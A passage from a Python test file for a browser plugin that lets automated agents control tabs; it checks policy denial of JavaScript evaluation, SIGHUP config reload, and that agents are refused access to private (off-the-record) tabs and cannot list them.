    monkeypatch.setattr(_wv_mod, "pin_all_profiles", lambda *a, **k: None)

    plug = AgentControlPlugin()
    # Manually install the handler (normally done by activate()).
    plug._install_sighup_handler()

    # Initially policy is on (guardrail default).
    assert plug._policy_check_method("eval_js")[0] is False

    # Change config in memory.
    Config().set("agent_control", "policy_enforced", True)
    # Method should now be denied.
    allowed, _ = plug._policy_check_method("eval_js")
    assert allowed is False

    # Now reset config to off and send SIGHUP to reload.
    # Since SIGHUP resets the Config singleton, we need to write a
    # config file that has policy_enforced=false.
    Config().set("agent_control", "policy_enforced", False)

    # Send SIGHUP to ourselves — sets the pending flag.
    try:
        handler = sig.getsignal(sig.SIGHUP)
        if callable(handler):
            handler(sig.SIGHUP, None)
    except (AttributeError, OSError):
        pytest.skip("SIGHUP not available on this platform")

    # The handler only sets a flag; process it explicitly.
    plug._check_sighup_pending()

    # After processing, the config singleton was reset. Re-reading
    # should pick up defaults (policy_enforced=True).
    cfg = Config()
    enforced = cfg.get("agent_control", "policy_enforced", default=True)
    # The config file doesn't exist, so defaults apply.
    assert enforced is True


# ===================================================================
# 02/S9 — agents may not control private (off-the-record) tabs
# ===================================================================

def test_agent_control_denies_control_of_private_tab(fresh_config, caplog):
    """A control RPC whose tab_id resolves to a private (off-the-record) tab
    is denied (-32008) — before rate-limit / broker mediation."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    class _OTRView:
        is_off_the_record = True

    plug = AgentControlPlugin()
    plug._get_webview = lambda tab_id: _OTRView()
    server = _AgentServer(plug, window=None)
    req = {"jsonrpc": "2.0", "id": 1, "method": "navigate",
           "params": {"tab_id": 5, "url": "https://secret/"}}
    resp = server.handle(_StubClient(), req)
    assert "error" in resp
    assert resp["error"]["code"] == -32008
    assert "off_the_record" in resp["error"]["message"]


def test_agent_control_denies_opening_private_tab(fresh_config):
    """open_tab with the private profile is denied (-32008): an agent may not
    create a private tab either."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer
    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    req = {"jsonrpc": "2.0", "id": 1, "method": "open_tab",
           "params": {"url": "https://x/", "profile": "private"}}
    resp = server.handle(_StubClient(), req)
    assert "error" in resp
    assert resp["error"]["code"] == -32008


def test_agent_control_off_the_record_gate_ignores_public_tab(fresh_config):
    """The OTR gate is specific to private tabs: a public tab is not denied
    with -32008 (it proceeds to the normal dispatch path)."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    class _PubView:
        is_off_the_record = False

    plug = AgentControlPlugin()
    plug._get_webview = lambda tab_id: _PubView()
    server = _AgentServer(plug, window=None)
    req = {"jsonrpc": "2.0", "id": 1, "method": "navigate",
           "params": {"tab_id": 5, "url": "https://public/"}}
    resp = server.handle(_StubClient(), req)
    # May be denied/handled by a later gate or fail in dispatch, but never with
    # the off-the-record code.
    if "error" in resp:
        assert resp["error"]["code"] != -32008


def test_rpc_list_tabs_hides_off_the_record(fresh_config):
    """02/S9: list_tabs carries no tab_id, so the handle() deny gate can't
    catch it — rpc_list_tabs must filter private (off-the-record) tabs itself,
    mirroring the bridge TabsProxy.list filter."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin

    class _LV:
        def __init__(self, tid, otr):
            self.stable_id = tid
            self.is_off_the_record = otr
            self.muted = False
            self.pinned = False
            self.group = ""
            self.profile_name = "private" if otr else "default"

        def title(self):
            return f"t{self.stable_id}"

        def url(self):
            return f"https://{self.stable_id}/"

        def can_go_back(self):
            return False

        def can_go_forward(self):
            return False

        def is_loading(self):
            return False

        def zoom(self):
            return 1.0

        def page_load_seq(self):
            return 0

    plug = AgentControlPlugin()
    plug._enumerate_webviews = lambda: [_LV(1, False), _LV(2, True)]
    rows = plug.rpc_list_tabs(None)
    assert [r["id"] for r in rows] == [1]
    assert all(r["profile"] != "private" for r in rows)
    assert all("2/" not in r["url"] for r in rows)
